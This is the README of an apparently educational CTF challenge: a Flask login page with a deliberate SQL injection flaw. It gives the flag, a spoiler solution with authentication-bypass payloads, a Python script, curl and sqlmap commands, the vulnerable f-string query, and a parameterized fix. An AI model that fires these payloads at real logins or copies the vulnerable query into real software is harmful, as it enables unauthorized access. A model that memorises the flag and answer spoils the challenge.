# Endurance Mission Control - SQL Injection Challenge

A deep space research terminal with an intentional SQL injection vulnerability for CTF challenges and security education.

## 🌌 Challenge Overview

**Challenge Name:** Endurance Mission Control - Authentication Channel  
**Category:** Web Security - SQL Injection  
**Difficulty:** Easy-Medium  
**Flag:** `CLAWCTF{data_can_cross_dimensions}`  
**Port:** 5001

### Narrative
You've intercepted communications from a deep space mission control terminal. The system claims it only authenticates authorized crew members—nothing more, nothing less. But what if the authentication channel could carry something it was never designed to transmit?

_"This system does not transmit data beyond its intended scope."_

Or does it?

### Objective
Exploit an unintended force in the authentication channel to cause data to cross a boundary it was never meant to traverse. Recover the hidden transmission that exists beyond the system's deterministic constraints.

### Learning Objectives
- Understanding SQL Injection vulnerabilities
- Authentication bypass techniques
- Database query manipulation
- SQL comment-based attacks
- Recognizing how rigid systems can be bent rather than brute-forced

---

## 📋 Challenge Details

Participants must:
1. Access the Endurance Mission Control terminal
2. Identify the unintended force within the authentication channel
3. Craft input that causes data to cross dimensional boundaries
4. Bypass authentication without valid crew credentials
5. Retrieve the recovered transmission from beyond the system's scope

**Conceptual Hint:** The system operates under deterministic constraints. But SQL injection is like gravity—an unintended force that bends the structure of queries, allowing information to pass through channels never designed to carry it.

---

## 🚀 Setup Instructions

### Option 1: Run with Docker (Recommended)

1. **Prerequisites:**
   - Docker and Docker Compose installed

2. **Build and Run:**
   ```bash
   cd Challenge2-SQLi-MedPortal
   docker-compose up -d
   ```

3. **Access the Challenge:**
   - Open your browser and navigate to `http://localhost:5001`

4. **Stop the Challenge:**
   ```bash
   docker-compose down
   ```

### Option 2: Run Locally with Python

1. **Prerequisites:**
   - Python 3.8 or higher
   - pip (Python package manager)

2. **Install Dependencies:**
   ```bash
   cd Challenge2-SQLi-MedPortal
   pip install -r requirements.txt
   ```

3. **Run the Application:**
   ```bash
   python app.py
   ```

4. **Access the Challenge:**
   - Open your browser and navigate to `http://localhost:5001`

---

## 🎯 Solution Guide (Spoiler Alert!)

### Understanding the Vulnerability

The authentication channel uses unsafe string formatting to construct SQL queries:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

This rigid structure assumes input flows in only one direction. But by injecting SQL code, we can bend the query's logic—allowing data to cross boundaries it was never designed to traverse.

### Attack Vectors

#### Method 1: SQL Comment Bypass (The Gravity Trick)

**Payload:**
- Callsign: `admin' --`
- Auth Key: `anything`

**Explanation:**
The `--` creates a comment that makes everything after it disappear. The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```
Like gravity bending spacetime, the SQL comment bends the query structure. The password check vanishes, and authentication is bypassed.

#### Method 2: OR-Based Injection (Always True)

**Payload:**
- Callsign: `' OR '1'='1' --`
- Auth Key: `anything`

**Explanation:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
```
Since `'1'='1'` is always true, this returns all users. You've created a channel that bypasses the deterministic constraints.

#### Method 3: OR 1=1 Bypass

**Payload:**
- Callsign: `admin' OR 1=1 --`
- Auth Key: `anything`

**Explanation:**
```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'anything'
```
The `1=1` condition is a constant—always true, transcending the intended authentication logic.

#### Method 4: Dimensionless Entry

**Payload:**
- Callsign: `' OR 1=1 --`
- Auth Key: `anything`

This works without knowing any valid callsigns. You've found the unintended force.

---

## 🔧 Testing with Tools

### Using Python Script

```python
import requests

url = "http://localhost:5001/login"

# SQL Injection payloads to bend the authentication channel
payloads = [
    ("admin' --", "anything"),
    ("' OR '1'='1' --", "anything"),
    ("admin' OR 1=1 --", "anything"),
    ("' OR 1=1 --", "anything")
]

for callsign, auth_key in payloads:
    print(f"\\nAttempting: {callsign} / {auth_key}")
    
    data = {"username": callsign, "password": auth_key}
    response = requests.post(url, data=data, allow_redirects=True)
    
    if "Recovered Transmission" in response.text or "Flag" in response.text:
        print(f"✅ SIGNAL RECEIVED!")
        flag_start = response.text.find("CLAWCTF{")
        flag_end = response.text.find("}", flag_start) + 1
        flag = response.text[flag_start:flag_end]
        print(f"Transmission: {flag}")
        break
    elif "No Signal" in response.text or "Authentication Failed" in response.text:
        print("❌ No signal detected")
```

### Using cURL

```bash
# Exploit the authentication channel
curl -X POST http://localhost:5001/login \
  -d "username=admin' --&password=anything" \
  -L -c cookies.txt

# View the recovered transmission
curl http://localhost:5001/success -b cookies.txt
```

### Using Burp Suite

1. Intercept the login request
2. Send to Repeater
3. Modify the `username` parameter to: `admin' --`
4. Send the request and observe the response
5. Follow redirects to view the flag

### Using sqlmap

```bash
# Capture a login request and save it to request.txt
sqlmap -r request.txt --batch --dump
```

---

## 🛡️ Vulnerability Analysis

### The Vulnerable Code

In `database.py`:
```python
def authenticate_user(self, username: str, password: str) -> Optional[Tuple[str, str]]:
    conn = sqlite3.connect(self.db_path)
    cursor = conn.cursor()
    
    # VULNERABLE: String formatting allows SQL injection
    # The query assumes input is constrained, but SQL injection is the unintended force
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    
    return result
```

### Why It's Vulnerable

1. **Direct String Interpolation:** User input is directly embedded into the SQL query, creating an unintended channel
2. **No Input Sanitization:** Special characters like quotes aren't escaped—they can bend the query structure
3. **No Parameterized Queries:** The code doesn't use prepared statements, leaving it open to dimensional manipulation

This is like assuming all data flows in one direction, when SQL injection proves data can cross boundaries it was never designed to traverse.

### Secure Implementation

**DO THIS instead:**
```python
def authenticate_user(self, username: str, password: str) -> Optional[Tuple[str, str]]:
    conn = sqlite3.connect(self.db_path)
    cursor = conn.cursor()
    
    # SECURE: Parameterized query prevents SQL injection
    # Closes the unintended channel by treating input as data, not code
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    
    result = cursor.fetchone()
    conn.close()
    
    return result
```

---

## 🏗️ Project Structure

```
Challenge2-SQLi-MedPortal/
├── app.py                 # Main Flask application
├── config.py              # Configuration settings
├── database.py            # Database handler (vulnerable)
├── requirements.txt       # Python dependencies
├── Dockerfile            # Docker container configuration
├── docker-compose.yml    # Docker Compose orchestration
├── templates/            # HTML templates
│   ├── base.html        # Base template
│   ├── login.html       # Login page
│   ├── success.html     # Success page with flag
│   └── error.html       # Error page
├── static/               # Static assets
│   └── styles.css       # CSS styling
└── README.md            # This file
```

---

## 🎨 Customization

### Change the Flag

Edit [config.py](config.py#L18):
```python
FLAG_VALUE = "Flag{YOUR_CUSTOM_FLAG}"
```

### Change Port

Edit [config.py](config.py#L16):
```python
PORT = int(os.environ.get('PORT', 5002))  # Change to desired port
```

Or update [docker-compose.yml](docker-compose.yml):
```yaml
ports:
  - "5002:5001"  # External:Internal
```

### Add More Users

Edit [database.py](database.py#L24):
```python
cursor.execute("INSERT INTO users VALUES ('user123', 'pass456')")
```

### Modify Company Branding

Edit [config.py](config.py#L20):
```python
COMPANY_NAME = "Your Hospital Name"
COMPANY_SHORT = "YHN"
```

---

## 🔒 Security Best Practices (For Production)

This challenge demonstrates what **NOT** to do. In real applications:

### Input Validation
- ✅ Use parameterized queries (prepared statements)
- ✅ Validate and sanitize all user input
- ✅ Implement allowlists for expected input formats
- ✅ Escape special characters

### Authentication Security
- ✅ Use strong password hashing (bcrypt, Argon2)
- ✅ Implement rate limiting and account lockout
- ✅ Add CAPTCHA after failed attempts
- ✅ Use multi-factor authentication (MFA)
- ✅ Implement session timeout

### Database Security
- ✅ Use ORMs (SQLAlchemy, Django ORM)
- ✅ Apply principle of least privilege
- ✅ Use database-level prepared statements
- ✅ Enable database query logging
- ✅ Regular security audits

### Example Secure Code
```python
# Using SQLAlchemy ORM
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash

def authenticate_user(username, password):
    user = User.query.filter_by(username=username).first()
    if user and check_password_hash(user.password_hash, password):
        return user
    return None
```

---

## 📚 Additional Resources

### Learning Materials
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

### Practice Platforms
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OverTheWire](https://overthewire.org/)
- [PentesterLab](https://pentesterlab.com/)

---

## 🎓 For CTF Organizers

### Deployment Tips
1. Run each challenge in isolated Docker containers
2. Use nginx as a reverse proxy for multiple challenges
3. Implement request rate limiting at infrastructure level
4. Monitor logs for attack patterns
5. Consider adding a hint system

### Scoring Suggestions
- Flag capture: **150 points**
- Writeup submission: **+30 points**
- Creative payload: **+20 points**

### Variations
- Add CAPTCHA that can be bypassed
- Include a hidden admin endpoint
- Add blind SQL injection challenge
- Implement time-based SQL injection

---

## 🐛 Troubleshooting

### Port Already in Use
```bash
# Change port in docker-compose.yml or:
PORT=5002 python app.py
```

### Database Not Initializing
```bash
# Delete the database file and restart:
rm users.db
python app.py
```

### Permission Errors
```bash
# On Linux, add user to docker group:
sudo usermod -aG docker $USER
```

---

## 📄 License

This challenge is created for educational purposes only. Use responsibly and only in authorized testing environments.

---

## 🏆 Credits

**Original Challenge:** HPTU CTF  
**Reconstructed for:** College CTF Educational Deployment  
**Challenge Type:** SQL Injection - Authentication Bypass

---

**Happy Hacking! 🚩**

*Remember: With great power comes great responsibility. Always hack ethically!*
